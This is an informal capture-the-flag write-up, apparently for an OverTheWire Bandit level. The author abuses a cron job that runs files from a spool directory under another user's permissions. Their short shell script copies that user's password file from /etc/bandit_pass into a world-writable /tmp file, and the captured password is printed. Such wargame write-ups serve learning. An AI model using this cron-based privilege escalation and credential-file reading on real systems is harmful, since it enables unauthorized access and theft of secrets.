A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.

NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

Commands you may need to solve this level
chmod, cron, crontab, crontab(5) (use “man 5 crontab” to access this)

#!/bin/bash

shopt -s nullglob

myname=$(whoami)

cd /var/spool/"$myname"/foo || exit
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." ] && [ "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" "./$i")"
        if [ "${owner}" = "bandit23" ] && [ -f "$i" ]; then
            timeout -s 9 60 "./$i"
        fi
        rm -rf "./$i"
    fi

this is the script made for bandit 24 (the next level which im suppose to look at)

this script finds a file owned by me (bandit 23) executes it and then deltes it
since it has bandit 24 permissions and naturally the password for bandit24, if it runs my script bandit23
I can make my script grab bandit's 24 password
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/TCL.txt

This is my script and it's named bandit23.sh
i had to do touch TCL.txt
then chmod 777 TCL.txt so script could write
then chmod 777 to bandit23.sh
then cp bandit23.sh /var/spool/bandit24/foo
and then waited for the script to run
bandit23@bandit:/tmp$ cat /tmp/TCL.txt
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
